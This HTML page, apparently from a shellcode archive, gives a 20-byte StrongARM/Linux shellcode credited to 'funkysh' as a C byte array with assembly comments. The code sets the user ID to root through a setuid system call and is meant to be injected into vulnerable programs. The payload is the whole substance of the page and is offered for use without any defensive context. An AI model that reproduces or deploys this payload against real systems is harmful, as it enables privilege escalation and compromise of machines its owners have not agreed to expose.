<html><head><title>StrongARM - setuid() - 20 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 * 20 byte StrongARM/Linux setuid() shellcode
 * funkysh
 */

char shellcode[]= &quot;\x02\x20\x42\xe0&quot;   /*  sub   r2, r2, r2            */
                  &quot;\x04\x10\x8f\xe2&quot;   /*  add   r1, pc, #4            */
                  &quot;\x12\x02\xa0\xe1&quot;   /*  mov   r0, r2, lsl r2        */
                  &quot;\x01\x20\xc1\xe5&quot;   /*  strb  r2, [r1, #1]          */
                  &quot;\x17\x0b\x90\xef&quot;;  /*  swi   0x90ff17              */


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
